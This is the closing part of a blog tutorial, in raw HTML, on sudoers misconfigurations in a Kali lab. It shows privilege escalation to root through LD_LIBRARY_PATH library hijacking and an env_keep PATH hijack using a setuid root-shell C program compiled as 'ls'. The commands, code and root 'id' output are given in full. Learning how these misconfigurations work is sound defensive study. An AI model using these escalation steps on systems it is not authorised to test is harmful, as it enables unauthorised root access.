+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ldd test2
+</span></span><span class=line><span class=cl>        linux-vdso.so.1 (0x00007f9cff805000)
+</span></span><span class=line><span class=cl>        libfoo.so =&gt; not found
+</span></span><span class=line><span class=cl>        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9cff5ea000)
+</span></span><span class=line><span class=cl>        /lib64/ld-linux-x86-64.so.2 (0x00007f9cff807000)
+</span></span></code></pre></td></tr></table></div></div>Compile the previous binary as one of the linked libraries<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>gcc -fPIC -shared -o libfoo.so root.c -nostartfiles
+</span></span></code></pre></td></tr></table></div></div>Set the Linked library path to the current directory<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-mysql data-lang=mysql><span class=line><span class=cl><span class=n>sudo</span><span class=w> </span><span class=n>LD_LIBRARY_PATH</span><span class=o>=`</span><span class=n>pwd</span><span class=o>`</span><span class=p>:</span><span class=err>$</span><span class=n>LD_LIBRARY_PATH</span><span class=w> </span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>kali</span><span class=o>/</span><span class=n>learning_materials</span><span class=o>/</span><span class=n>learn_sudoers</span><span class=o>/</span><span class=n>test2</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div>Output:<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>┌──(root㉿kali)-[/home/kali/learning_materials/learn_sudoers]
+</span></span><span class=line><span class=cl>└─# id
+</span></span><span class=line><span class=cl>uid=0(root) gid=0(root) groups=0(root)
+</span></span></code></pre></td></tr></table></div></div></li></ol><h2 id=preserve-selected-environment-variables-2>Preserve selected Environment Variables 2</h2><ol><li>To preserve only certain environment variables (safer),<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>Defaults env_reset
+</span></span><span class=line><span class=cl>Defaults:normaluser <span class=nv>env_keep</span><span class=o>+=</span>PATH
+</span></span><span class=line><span class=cl><span class=c1># User privilege specification</span>
+</span></span><span class=line><span class=cl>normaluser <span class=nv>kali</span><span class=o>=(</span>root<span class=o>)</span> ls -la
+</span></span></code></pre></td></tr></table></div></div></li><li>This configuration is unfortunately still vulnerable to a privilege escalation technique.
+Create a rootshell binary<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// root.c
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl><span class=nf>setgid</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nf>setuid</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/bash&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div>Compile the root shell binary as the allowed binary<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>gcc root_not_so.c -o ls
+</span></span></code></pre></td></tr></table></div></div>Set the PATH variable<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-mysql data-lang=mysql><span class=line><span class=cl><span class=err>$</span><span class=w> </span><span class=n>PATH</span><span class=o>=`</span><span class=n>pwd</span><span class=o>`</span><span class=p>:</span><span class=err>$</span><span class=n>PATH</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=err>$</span><span class=w> </span><span class=n>echo</span><span class=w> </span><span class=err>$</span><span class=n>PATH</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>kali</span><span class=o>/</span><span class=n>learning_materials</span><span class=o>/</span><span class=n>learn_sudoers</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>local</span><span class=o>/</span><span class=n>sbin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>local</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>sbin</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>local</span><span class=o>/</span><span class=n>games</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>games</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div>Execute the sudo command<ul><li>This does not work in the current version of <code>sudo</code>: <code>/etc/sudoers:49:24: expected a fully-qualified path name</code></li></ul></li></ol><h2 id=references>References</h2><ol><li>Sudoers Manual: <a class=link href=https://www.sudo.ws/docs/man/sudoers.man/ target=_blank rel=noopener>https://www.sudo.ws/docs/man/sudoers.man/</a></li><li>Good Medium Post on Sudoers misconfigurations: <a class=link href=https://medium.com/@mysticraganork66/why-misconfigured-sudo-is-a-hackers-playground-3e23ab15c889 target=_blank rel=noopener>https://medium.com/@mysticraganork66/why-misconfigured-sudo-is-a-hackers-playground-3e23ab15c889</a></li></ol></section><footer class=article-footer><section class=article-tags><a href=/tags/linux/>Linux</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/electron-xss-to-rce/><div class=article-details><h2 class=article-title>Electron XSS to RCE</h2></div></a></article><article><a href=/p/xs-leaks-leveraging-cve-2024-11110/><div class=article-details><h2 class=article-title>XS Leaks Leveraging CVE 2024 11110</h2></div></a></article><article><a href=/p/common-apache-tomcat-misconfigurations-and-remediations/><div class=article-details><h2 class=article-title>Common Apache Tomcat Misconfigurations and Remediations</h2></div></a></article><article><a href=/p/github-actions-primer-workflows-for-continuous-integration/><div class=article-details><h2 class=article-title>GitHub Actions Primer - Workflows for Continuous Integration</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
+2025 -
+2026 Froginacup's site</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.33.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
